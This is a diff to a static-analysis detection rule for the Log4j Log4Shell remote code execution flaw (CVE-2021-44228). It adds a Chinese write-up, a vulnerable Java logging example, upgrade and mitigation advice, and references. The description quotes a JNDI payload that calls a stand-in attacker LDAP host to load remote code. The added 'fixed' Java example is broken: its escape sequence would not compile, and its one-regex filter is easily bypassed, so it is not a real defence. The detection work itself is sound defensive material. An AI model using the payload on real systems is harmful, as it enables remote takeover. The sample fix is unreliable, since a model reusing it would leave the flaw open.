@@ -1,11 +1,94 @@
 desc(
-	title: 'Log4j Security Checking'
-	title_zh: 'Log4j 安全检查',
+	title: "Detect Java Log4j Remote Code Execution Vulnerability"
+	title_zh: "检测Java Log4j远程代码执行漏洞"
 	type: vuln
-	desc: <<<TEXT
-Log4j是一个广泛使用的Java日志记录库。某些版本的Log4j存在严重的安全漏洞，允许攻击者通过日志记录功能执行远程代码（RCE）。特别是，当应用程序通过Log4j记录用户输入的数据时，攻击者可以构造恶意的输入，利用JNDI（Java Naming and Directory Interface）注入攻击来触发漏洞。这可能导致服务器被完全控制，泄露敏感数据或执行其他恶意操作。因此，建议更新到不受影响的Log4j版本，并避免在日志消息中记录不受信任的用户输入。
-TEXT
+	desc: <<<DESC
+### 漏洞描述
+
+1. **漏洞原理**
+   Log4j是一个广泛使用的Java日志记录库。某些版本的Log4j（特别是2.0-beta9到2.17.0之间的版本）存在严重的安全漏洞（Log4Shell，CVE-2021-44228等）。该漏洞源于Log4j对JNDI（Java Naming and Directory Interface）查找功能的处理不当。当应用程序在日志消息中包含了可以通过JNDI解析的恶意字符串时，攻击者可以远程加载并执行恶意Java类，实现远程代码执行（RCE）。
+
+2. **触发场景**
+   攻击者可以通过各种方式将恶意字符串注入到被Log4j记录的数据中，例如HTTP请求头（如User-Agent、Referer）、POST请求参数、URL参数、用户输入表单数据等。当应用程序使用脆弱版本的Log4j记录这些包含恶意JNDI查找字符串（如 `${jndi:ldap://attacker.com/a}`）的数据时，Log4j会尝试解析并执行该查找，连接到攻击者控制的LDAP服务器，并加载恶意Java类。
+
+   // 存在漏洞的代码示例
+   ```java
+   import org.apache.logging.log4j.LogManager;
+   import org.apache.logging.log4j.Logger;
+   import javax.servlet.http.HttpServletRequest;
+
+   public class VulnerableLog4jExample {
+       private static final Logger logger = LogManager.getLogger(VulnerableLog4jExample.class);
+
+       public String handleRequest(HttpServletRequest request) {
+           String userInput = request.getParameter("data");
+           logger.info("Received data: " + userInput); // 直接记录用户输入
+           return "Processed";
+       }
+   }
+   ```
+
+3. **潜在影响**
+   攻击者可以利用该漏洞在目标服务器上执行任意代码，导致：
+    - 完全控制受影响的服务器。
+    - 窃取敏感数据。
+    - 安装后门、勒索软件或其他恶意软件。
+    - 进一步渗透内网。
+    - 拒绝服务（DoS）。
+DESC
 	rule_id: "815144fa-b327-4842-b75d-a7bcc9e6ea6a"
+	solution: <<<SOLUTION
+### 修复建议
+
+1. **升级Log4j版本**
+   及时将Log4j升级到不受漏洞影响的最新版本。对于Log4j 2，建议升级到2.17.1及更高版本。对于Log4j 1.x，由于已不再维护且存在其他安全问题，建议迁移到Log4j 2或Logback等其他日志框架。
+   ```xml
+   <!-- Maven pom.xml 示例：升级至安全版本 -->
+   <dependency>
+       <groupId>org.apache.logging.log4j</groupId>
+       <artifactId>log4j-core</artifactId>
+       <version>2.17.1</version> <!-- 或更高版本 -->
+   </dependency>
+   <dependency>
+       <groupId>org.apache.logging.log4j</groupId>
+       <artifactId>log4j-api</artifactId>
+       <version>2.17.1</version> <!-- 或更高版本 -->
+   </dependency>
+   ```
+
+2. **配置缓解措施（针对暂时无法升级的情况）**
+   - **Log4j 2.10 - 2.14.1 版本：** 设置系统属性 `log4j2.formatMsgNoLookups` 为 `true` 或设置环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS` 为 `true`。
+   - **Log4j 2.0-beta9 - 2.10.0 版本：** 从classpath中移除 `JndiLookup` 类。例如，可以通过jar包管理工具或手动删除`org/apache/logging/log4j/core/lookup/JndiLookup.class`。
+   - 配置限制JNDI查找协议，仅允许本地安全的协议。
+
+3. **避免在日志消息中直接包含用户控制的输入**
+   尽量避免直接将不可信的用户输入用于日志消息，特别是那些可能被Log4j解析的字段。如果必须记录用户输入，考虑对输入进行过滤或脱敏，移除或转义可能触发JNDI查找的特殊字符。
+   ```java
+   // 修复代码示例：对用户输入进行过滤或脱敏
+   import org.apache.logging.log4j.LogManager;
+   import org.apache.logging.log4j.Logger;
+   import javax.servlet.http.HttpServletRequest;
+
+   public class SafeLog4jExample {
+       private static final Logger logger = LogManager.getLogger(SafeLog4jExample.class);
+
+       public String handleRequest(HttpServletRequest request) {
+           String userInput = request.getParameter("data");
+           // 对用户输入进行脱敏或过滤，移除潜在的恶意字符串
+           String safeInput = userInput.replaceAll("\$\{jndi:.*\}", "[FILTERED]");
+           logger.info("Received data: " + safeInput); // 记录安全后的输入
+           return "Processed";
+       }
+   }
+   ```
+
+4. **最小化应用程序权限**
+   在应用部署环境中，限制运行应用程序的用户或服务账号的权限，即使发生漏洞，也能限制攻击者能造成的损害。
+SOLUTION
+	reference: <<<REFERENCE
+[CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)
+[Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
+REFERENCE
 )
 
 __dependency__./org.apache.logging.log4j/?{<self>.name?{have:'og4j-core'} }.version as $ver;
